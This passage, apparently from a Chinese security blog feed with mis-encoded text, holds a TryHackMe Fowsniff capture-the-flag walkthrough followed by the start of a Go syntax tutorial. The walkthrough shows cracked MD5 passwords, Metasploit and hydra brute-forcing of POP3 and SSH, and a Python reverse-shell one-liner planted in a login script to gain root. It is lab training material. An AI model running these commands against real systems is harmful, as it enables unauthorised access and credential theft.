class="hljs-comment">-----.oooO--(_)--Oooo.------+</span><br>|                            |<br>|          FOWSNIFF          |<br>|            got             |<br>|           PWN3D!!!         |<br>|                            |         <br>|       .oooO                |         <br>|        (   )   Oooo.       |         <br>+<span class="hljs-comment">---------\ (----(   )-------+</span><br>           \_)    ) /<br>                 (_/<br>FowSniff Corp got pwn3d <span class="hljs-keyword">by</span> B1gN1nj4!<br>No one <span class="hljs-keyword">is</span> safe <span class="hljs-keyword">from</span> <span class="hljs-keyword">my</span> <span class="hljs-number">1337</span> skillz!<br><br><br>mauer@fowsniff:<span class="hljs-number">8</span>a28a94a588a95b80163709ab4313aa4<br>mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56<br>tegel@fowsniff:<span class="hljs-number">1</span>dc352435fecca338acfd4be10984009<br>baksteen@fowsniff:<span class="hljs-number">19</span>f5af754c31f1e2651edde9250d69bb<br>seina@fowsniff:<span class="hljs-number">90</span>dc16d47114aa13671c697fd506cf26<br>stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd<br>mursten@fowsniff:<span class="hljs-number">0e9588</span>cb62f4b6f27e33d449e2ba0b3b<br>parede@fowsniff:<span class="hljs-number">4</span>d6e42f56e127803285a0a7649b5ab11<br>sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e<br><br>Fowsniff Corporation Passwords LEAKED!<br>FOWSNIFF CORP PASSWORD DUMP!<br><br>Here are their email passwords dumped <span class="hljs-keyword">from</span> their databases.<br>They left their pop3 server WIDE OPEN, too!<br><br>MD5 <span class="hljs-keyword">is</span> insecure, so you shouldn&#x27;t have trouble cracking them <span class="hljs-keyword">but</span> I was too lazy haha =P<br><br>l8r n00bz!<br><br>B1gN1nj4<br><br><span class="hljs-comment">-------------------------------------------------------------------------------------------------</span><br>This <span class="hljs-built_in">list</span> <span class="hljs-keyword">is</span> entirely fictional <span class="hljs-keyword">and</span> <span class="hljs-keyword">is</span> part <span class="hljs-keyword">of</span> a Capture <span class="hljs-keyword">the</span> Flag educational challenge.<br><br>All information contained within <span class="hljs-keyword">is</span> invented solely <span class="hljs-keyword">for</span> this purpose <span class="hljs-keyword">and</span> <span class="hljs-keyword">does</span> <span class="hljs-keyword">not</span> correspond<br><span class="hljs-keyword">to</span> any <span class="hljs-built_in">real</span> persons <span class="hljs-keyword">or</span> organizations.<br><br>Any similarities <span class="hljs-keyword">to</span> actual people <span class="hljs-keyword">or</span> entities <span class="hljs-keyword">is</span> purely coincidental <span class="hljs-keyword">and</span> occurred accidentally.<br></code></pre></td></tr></table></figure><p>ä»ä¸Šé¢ä¿¡æ¯ä¸­æˆ‘ä»¬èƒ½å‘ç°æ³„éœ²äº†ç”µå­é‚®ä»¶åœ°å€å’Œå¯†ç  hash å€¼</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">mauer<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span>a28a94a588a95b80163709ab4313aa4<br>mustikka<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:ae1644dac5b77c0cf51e0d26ad6d7e56</span><br>tegel<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span>dc352435fecca338acfd4be10984009<br>baksteen<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span>f5af754c31f1e2651edde9250d69bb<br>seina<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">90</span>dc16d47114aa13671c697fd506cf26<br>stone<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:a92b8a29ef1183192e3d35187e0cfabd</span><br>mursten<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span>e9588cb62f4b6f27e33d449e2ba0b3b<br>parede<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:</span><span class="hljs-number">4</span>d6e42f56e127803285a0a7649b5ab11<br>sciana<span class="hljs-variable">@fowsniff</span><span class="hljs-symbol">:f7fd98d380735e859f8b2ffbbede5a7e</span><br></code></pre></td></tr></table></figure><p>ç”¨ <a href="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash</a> è§£å‡ºå¯†ç </p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">8a28a94a588a95b80163709ab4313aa4</span>:mailcall<br><span class="hljs-attribute">ae1644dac5b77c0cf51e0d26ad6d7e56</span>:bilbo101<br><span class="hljs-attribute">1dc352435fecca338acfd4be10984009</span>:apples01<br><span class="hljs-attribute">19f5af754c31f1e2651edde9250d69bb</span>:skyler22<br><span class="hljs-attribute">90dc16d47114aa13671c697fd506cf26</span>:scoobydoo2<br>a92b8a29ef1183192e3d35187e0cfabdï¼šè¿™ä¸ªæ²¡æ‰¾åˆ°<br><span class="hljs-attribute">0e9588cb62f4b6f27e33d449e2ba0b3b</span>:carp4ever<br><span class="hljs-attribute">4d6e42f56e127803285a0a7649b5ab11</span>:orlando12<br><span class="hljs-attribute">f7fd98d380735e859f8b2ffbbede5a7e</span>:07011972<br></code></pre></td></tr></table></figure><h1 id="ç™»å½•"><a href="#ç™»å½•" class="headerlink" title="ç™»å½•"></a>ç™»å½•</h1><h2 id="Metasploit-hydra"><a href="#Metasploit-hydra" class="headerlink" title="Metasploit &amp; hydra"></a>Metasploit &amp; hydra</h2><p>ç°åœ¨å·²ç»æœ‰ç”¨æˆ·åå’Œå¯†ç äº†ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ Metasploit çš„ <code>pop3_login</code> æ¨¡å—ï¼Œä½¿ç”¨ä¹‹å‰æ‰¾åˆ°çš„ä¿¡æ¯æ¥æš´åŠ›ç ´è§£ POP3 </p><p><img src="https://img.dkdun.cn/v1/2025/12/9e60709cb2963e6f.png"></p><p>å°†ç”¨æˆ·åå’Œå¯†ç åˆ†åˆ«æ·»åŠ åˆ° usernames.txt å’Œ passwords.txt é‡Œé¢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/scanner/pop3/pop3_login<br><span class="hljs-built_in">set</span> rhost 10.10.253.104 (å› ä¸ºä¸­é—´æœ‰äº‹æƒ…å‡ºé—¨äº†æ‰€ä»¥å›æ¥é‡æ–°å¼€çš„æœºå™¨)<br><span class="hljs-built_in">set</span> user_file /home/butt3rf1y/usernames.txt<br><span class="hljs-built_in">set</span> pass_file /home/butt3rf1y/passwords.txt<br>run<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/418d66c60817deff.png"></p><p>çˆ†å‡ºæ¥å‘ç° 1ä¸ªå¸æˆ·æœ‰æ•ˆï¼š<code>seina:scoobydoo2</code>ï¼ˆmsf å¥½æ…¢å”‰å”‰å”‰:( </p><p>ç™»å½•é‚®ç®±æŸ¥çœ‹</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">10.10.253.104</span> <span class="hljs-number">110</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6aadde59584c0b29.png"></p><p>list å‘ç°æœ‰ä¸¤å°é‚®ä»¶ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ã€‚retr 1 è¯»å–ç¬¬ä¸€å°</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">Return</span>-Path: &lt;stone<span class="hljs-comment">@fowsniff&gt;</span><br><span class="hljs-comment">X-Original-To: seina@</span>fowsniff<br>Delivered-To: seina<span class="hljs-comment">@fowsniff</span><br><span class="hljs-comment">Received: by fowsniff (Postfix, from userid 1000)</span><br><span class="hljs-comment">        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)</span><br><span class="hljs-comment">To: baksteen@</span>fowsniff, mauer<span class="hljs-comment">@fowsniff, mursten@</span>fowsniff,<br>    mustikka<span class="hljs-comment">@fowsniff, parede@</span>fowsniff, sciana<span class="hljs-comment">@fowsniff, seina@</span>fowsniff,<br>    tegel<span class="hljs-comment">@fowsniff</span><br><span class="hljs-comment">Subject: URGENT! Security EVENT!</span><br><span class="hljs-comment">Message-Id: &lt;20180313185107.0FA3916A@</span>fowsniff&gt;<br><span class="hljs-built_in">Date</span>: Tue, <span class="hljs-number">13</span> Mar <span class="hljs-number">2018</span> <span class="hljs-number">14</span>:<span class="hljs-number">51</span>:<span class="hljs-number">07</span> <span class="hljs-number">-0400</span> (EDT)<br>From: stone<span class="hljs-comment">@fowsniff (stone)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Dear All,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">A few days ago, a malicious actor was able to gain entry to</span><br><span class="hljs-comment">our internal email systems. The attacker was able to exploit</span><br><span class="hljs-comment">incorrectly filtered escape characters within our SQL database</span><br><span class="hljs-comment">to access our login credentials. Both the SQL and authentication</span><br><span class="hljs-comment">system used legacy methods that had not been updated in some time.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">We have been instructed to perform a complete internal system</span><br><span class="hljs-comment">overhaul. While the main systems are &quot;in the shop,&quot; we have</span><br><span class="hljs-comment">moved to this isolated, temporary server that has minimal</span><br><span class="hljs-comment">functionality.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">This server is capable of sending and receiving emails, but only</span><br><span class="hljs-comment">locally. That means you can only send emails to other users, not</span><br><span class="hljs-comment">to the world wide web. You can, however, access this system via</span><br><span class="hljs-comment">the SSH protocol.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">The temporary password for SSH is &quot;S1ck3nBluff+secureshell&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">You MUST change this password as soon as possible, and you will do so under my</span><br><span class="hljs-comment">guidance. I saw the leak the attacker posted online, and I must say that your</span><br><span class="hljs-comment">passwords were not very secure.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Come see me in my office at your earliest convenience and we&#x27;ll set it up.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Thanks,</span><br><span class="hljs-comment">A.J Stone</span><br></code></pre></td></tr></table></figure><p>retr 2</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">Return</span>-Path: &lt;baksteen@fowsniff&gt;<br>X-Original-<span class="hljs-keyword">To</span>: seina@fowsniff<br>Delivered-<span class="hljs-keyword">To</span>: seina@fowsniff<br><span class="hljs-symbol">Received:</span> <span class="hljs-keyword">by</span> fowsniff (Postfix, <span class="hljs-keyword">from</span> userid <span class="hljs-number">1004</span>)<br>        id <span class="hljs-number">101</span>CA1AC2; Tue, <span class="hljs-number">13</span> Mar <span class="hljs-number">2018</span> <span class="hljs-number">14</span>:<span class="hljs-number">54</span>:<span class="hljs-number">05</span> -<span class="hljs-number">0400</span> (EDT)<br><span class="hljs-symbol">To:</span> seina@fowsniff<br><span class="hljs-symbol">Subject:</span> You missed out!<br>Message-Id: &lt;<span class="hljs-number">20180313185405.101</span>CA1AC2@fowsniff&gt;<br><span class="hljs-symbol">Date:</span> Tue, <span class="hljs-number">13</span> Mar <span class="hljs-number">2018</span> <span class="hljs-number">14</span>:<span class="hljs-number">54</span>:<span class="hljs-number">05</span> -<span class="hljs-number">0400</span> (EDT)<br><span class="hljs-symbol">From:</span> baksteen@fowsniff<br><br>Devin,<br><br>You should have seen the brass lay <span class="hljs-keyword">into</span> AJ today!<br>We are going <span class="hljs-keyword">to</span> be talking about this one <span class="hljs-keyword">for</span> a looooong time hahaha.<br>Who knew the regional manager had been <span class="hljs-keyword">in</span> the navy? She was swearing <span class="hljs-built_in">like</span> a sailor!<br><br>I don<span class="hljs-comment">&#x27;t know what kind of pneumonia or something you brought back with</span><br>you <span class="hljs-keyword">from</span> your camping trip, but I think I<span class="hljs-comment">&#x27;m coming down with it myself.</span><br>How <span class="hljs-type">long</span> have you been gone - a week?<br><span class="hljs-keyword">Next</span> time you<span class="hljs-comment">&#x27;re going to get sick and miss the managerial blowout of the century,</span><br>at least keep it <span class="hljs-keyword">to</span> yourself!<br><br>I<span class="hljs-comment">&#x27;m going to head home early and eat some chicken soup.</span><br>I think I just got an email <span class="hljs-keyword">from</span> Stone, too, but it<span class="hljs-comment">&#x27;s probably just some</span><br><span class="hljs-string">&quot;Let me explain the tone of my meeting with management&quot;</span> face-saving mail.<br>I<span class="hljs-comment">&#x27;ll read it when I get back.</span><br><br>Feel better,<br><br>Skyler<br><br><span class="hljs-symbol">PS:</span> Make sure you change your email password.<br>AJ had been telling us <span class="hljs-keyword">to</span> <span class="hljs-keyword">do</span> that right before Captain Profanity showed up.<br></code></pre></td></tr></table></figure><p>ç»¼åˆæ¥çœ‹ï¼Œæˆ‘ä»¬åœ¨ç¬¬ä¸€å°é‚®ä»¶é‡Œé¢å‘ç°äº†ä¸€å¥ â€œ<strong>The temporary password for SSH is â€œ<code>S1ck3nBluff+secureshell</code></strong>â€œâ€ï¼Œä¸€ä¸ªä¸´æ—¶å¯†ç </p><p>è¿˜æœ‰å¾ˆå¤šæ”¶ä»¶äººâ€œ<strong>baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,mustikka@fowsniff, parede@fowsniff, sciana@fowsniff,seina@fowsniff,tegel@fowsniff</strong>â€ï¼Œåˆ›å»ºä¸€ä¸ª sshusers.txt æ–‡ä»¶ï¼Œç”¨ hydra æ¥ç¡®è®¤å“ªäº›ç”¨æˆ·æ²¡æœ‰æ”¹å¯†ç </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hydra -L sshusers<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">p</span> S1ck3nBluff+secureshell ssh:<span class="hljs-comment">//10.10.253.104</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/10f2b0c72f5242b6.png"></p><p>ç”±æ­¤ç¡®è®¤ç”¨æˆ· <code>bsksteen</code> æ²¡æœ‰ä¿®æ”¹å¯†ç ï¼Œç°åœ¨å¯ä»¥ç›´æ¥ ssh è¿æ¥</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> baksteen@<span class="hljs-number">10.10.253.104</span><br></code></pre></td></tr></table></figure><p>è¿ä¸Šä¹‹åå‘ç° baksteen å±äº <code>users</code></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">find / -<span class="hljs-keyword">type</span> f -<span class="hljs-keyword">group</span> <span class="hljs-title">users</span> <span class="hljs-number">2</span>&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6376db1485fae637.png"></p><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ª shell è„šæœ¬ï¼Œ<code>/opt/cube/cube.sh</code>ï¼Œçœ‹äº†ä¸€ä¸‹å°±æ˜¯ç™»å½•æ—¶æ˜¾ç¤ºçš„é‚£ä¸ªå›¾ç”»ï¼Œä½†æ˜¯å¯ä»¥ä¿®æ”¹ï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥å†™åå‘ shell äº†</p><h1 id="åå¼¹-shell"><a href="#åå¼¹-shell" class="headerlink" title="åå¼¹ shell"></a>åå¼¹ shell</h1><p>å°†ä¸‹åˆ— shell å†™å…¥ <code>/opt/cube/cube.sh</code> è„šæœ¬ä¸­ä¿å­˜</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tcl">python3 -c &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;10.14.96.245&quot;</span>,<span class="hljs-number">1234</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;<br></code></pre></td></tr></table></figure><p>é€€å‡ºé‡æ–°ç™»å½•ï¼Œç”¨ nc ç›‘å¬å¼¹ shell çš„ç«¯å£ï¼ˆæˆ‘æ˜¯ç”¨çš„ WSLï¼Œæ‰€ä»¥æˆ‘ç›´æ¥ç”¨ Windows çš„ ncat ç›‘å¬çš„ï¼‰</p><p>å‘ç°æˆåŠŸåå¼¹å¼¹äº†æ‹¥æœ‰ root æƒé™çš„ shell</p><p><img src="https://img.dkdun.cn/v1/2025/12/231d23c335df025c.png"></p><p>æˆåŠŸæ‹¿åˆ° flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/e9f930db078e1a62.png"></p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>THM æ¸—é€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Re:ä»é›¶å¼€å§‹çš„ Go ä¹‹æ—…-åŸºæœ¬è¯­æ³•</title>
    <link href="/2025/01/20/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
    <url>/2025/01/20/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>GoGoGo!</p><span id="more"></span><p>å…ˆçœ‹ä¸€ä¸ªç®€å•çš„ä»£ç ï¼Œç†Ÿæ‚‰ä¸€ä¸‹ç®€å•è¯­æ³•</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   fmt.Println(<span class="hljs-string">&quot;Hello butt3rf1y!&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>package</strong>ï¼šå£°æ˜å½“å‰æ–‡ä»¶å±äºå“ªä¸€ä¸ªåŒ…ï¼Œå…¥å£æ–‡ä»¶éƒ½<strong>å¿…é¡»ä¸º <code>main</code> åŒ…</strong>ï¼Œå…¥å£å‡½æ•°æ˜¯ main å‡½æ•°ã€‚</p><p><strong>import</strong>ï¼šå¯¼å…¥å…³é”®å­—ï¼Œfmt æ˜¯å¯¼å…¥çš„åŒ…åã€‚</p><p><strong>func</strong>ï¼šå‡½æ•°å£°æ˜å…³é”®å­—ã€‚</p><h1 id="åŒ…"><a href="#åŒ…" class="headerlink" title="åŒ…"></a>åŒ…</h1><p>åœ¨ go ä¸­ï¼Œç¨‹åºé€šè¿‡å°†åŒ…é“¾æ¥åœ¨ä¸€èµ·æ¥æ„å»ºï¼Œgo ä¸­å¯¼å…¥çš„æœ€åŸºæœ¬å•ä½æ˜¯ä¸€ä¸ª<strong>åŒ…</strong>ï¼Œä¸æ˜¯ <code>.go</code> æ–‡ä»¶ã€‚åŒ…å†…å…±äº«æ‰€æœ‰å˜é‡ï¼Œå¸¸é‡ä»¥åŠæ‰€æœ‰å®šä¹‰çš„ç±»å‹ï¼Œè€Œä¸”åŒ…åå»ºè®®å°å†™ã€‚</p><h2 id="å¯è§æ€§"><a href="#å¯è§æ€§" class="headerlink" title="å¯è§æ€§"></a>å¯è§æ€§</h2><p>go ä¸­æ§åˆ¶åŒ…å†…èµ„æºå¯è§æ€§æœ‰ä¸¤ç§æ–¹æ³•</p><ol><li>åç§°å¤§å†™å­—æ¯å¼€å¤´ï¼Œå³ä¸º<strong>å…¬æœ‰</strong></li><li>å°å†™æˆ–ä¸‹åˆ’çº¿å¼€å¤´ï¼Œå³ä¸º<strong>ç§æœ‰</strong></li></ol><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">package</span> <span class="hljs-title class_">butt3r</span><br><br><span class="hljs-keyword">const</span> User = <span class="hljs-string">&quot;butt3rf1y&quot;</span><span class="hljs-comment">//å…¬æœ‰</span><br><br><span class="hljs-keyword">const</span> passwd = <span class="hljs-number">114514</span><span class="hljs-comment">//ç§æœ‰</span><br></code></pre></td></tr></table></figure><h2 id="å¯¼å…¥"><a href="#å¯¼å…¥" class="headerlink" title="å¯¼å…¥"></a>å¯¼å…¥</h2><p>å¯¼å…¥åŒ…å°±æ˜¯å¯¼å…¥è¿™ä¸ªåŒ…çš„æ‰€æœ‰å…¬æœ‰çš„ç±»å‹&#x2F;å˜é‡&#x2F;å¸¸é‡</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">import</span> åŒ…å<br></code></pre></td></tr></table></figure><p>å¯¼å…¥å•ä¸ªåŒ…æ—¶</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">package</span> <span class="hljs-title">main</span><br><br>import <span class="hljs-string">&quot;example&quot;</span><br></code></pre></td></tr></table></figure><p>å¯¼å…¥å¤šä¸ªåŒ…æ—¶</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;example&quot;</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;example2&quot;</span><br></code></pre></td></tr></table></figure><p>å¯¼å…¥å¤šä¸ªåŒ…æ—¶ä¹Ÿå¯ä»¥ç”¨ <code>&#123;&#125;</code> æ‹¬èµ·æ¥</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">package</span> <span class="hljs-title">main</span><br><br>import (<br><span class="hljs-string">&quot;example&quot;</span><br><span class="hljs-string">&quot;example1&quot;</span><br>)<br></code></pre></td></tr></table></figure><p>å¦‚æœåŒ…åé‡å¤æˆ–æ¯”è¾ƒå¤æ‚ï¼Œå¯ä»¥èµ·ä¸€ä¸ªåˆ«å</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">package</span> <span class="hljs-title">main</span><br><br>import (<br>e <span class="hljs-string">&quot;example&quot;</span><br>e1 <span class="hljs-string">&quot;example1&quot;</span><br><br></code></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§åŒ¿åå¯¼å…¥åŒ…ï¼Œä½†æ˜¯åŒ¿åå¯¼å…¥çš„åŒ…æ— æ³•ä½¿ç”¨ï¼Œä¸€èˆ¬è¿™ä¹ˆåšæ˜¯ä¸ºäº†åŠ è½½åŒ…ä¸‹çš„ <code>init</code> å‡½æ•°ï¼Œä½†åˆä¸éœ€è¦åŒ…ä¸­çš„ç±»å‹ï¼Œæ¯”å¦‚è¯´æ³¨å†Œæ•°æ®åº“é©±åŠ¨</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>e <span class="hljs-string">&quot;example&quot;</span><br><span class="hljs-literal">_</span> <span class="hljs-string">&quot;mysql-driver&quot;</span><br>)<br></code></pre></td></tr></table></figure><p>å¯¼å…¥åŒ…åï¼Œå¯ä»¥é€šè¿‡ <code>åç§°.æ ‡è¯†ç¬¦</code> å»è®¿é—®ï¼Œæ¯”å¦‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;example&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(example.User)<br>&#125;<br></code></pre></td></tr></table></figure><p>ç§æœ‰ç±»å‹æ— æ³•è®¿é—®ï¼Œå¹¶ä¸” go ä¸æ”¯æŒå¾ªç¯å¯¼å…¥ï¼Œä¸ç®¡æ˜¯ç›´æ¥çš„è¿˜æ˜¯é—´æ¥çš„ã€‚ä¾‹å¦‚åŒ… A å¯¼å…¥äº†åŒ… Bï¼ŒåŒ… B ä¹Ÿå¯¼å…¥äº†åŒ… Aï¼Œè¿™æ˜¯ç›´æ¥å¾ªç¯å¯¼å…¥ï¼›åŒ… A å¯¼å…¥äº†åŒ… Cï¼ŒåŒ… C å¯¼å…¥äº†åŒ… Bï¼ŒåŒ… B åˆå¯¼å…¥äº†åŒ… Aï¼Œè¿™å°±æ˜¯é—´æ¥çš„å¾ªç¯å¯¼å…¥ï¼Œå­˜åœ¨å¾ªç¯å¯¼å…¥çš„è¯å°†ä¼šæ— æ³•é€šè¿‡ç¼–è¯‘ã€‚</p><h2 id="å†…éƒ¨åŒ…"><a href="#å†…éƒ¨åŒ…" class="headerlink" title="å†…éƒ¨åŒ…"></a>å†…éƒ¨åŒ…</h2><p>go ä¸­ä¸€ä¸ªåŒ…å†…åä¸º <code>internal</code> åŒ…ä¸ºå†…éƒ¨åŒ…ï¼Œå¤–éƒ¨åŒ…æ— æ³•è®¿é—®å†…éƒ¨åŒ…</p><h1 id="æ ‡è¯†ç¬¦"><a href="#æ ‡è¯†ç¬¦" class="headerlink" title="æ ‡è¯†ç¬¦"></a>æ ‡è¯†ç¬¦</h1><p>go ä¸­æ‰€æœ‰å†…ç½®å…³é”®å­—</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">break</span>        <span class="hljs-keyword">default</span>      func         <span class="hljs-keyword">interface</span>    <span class="hljs-symbol">select</span><br><span class="hljs-symbol">case</span>         <span 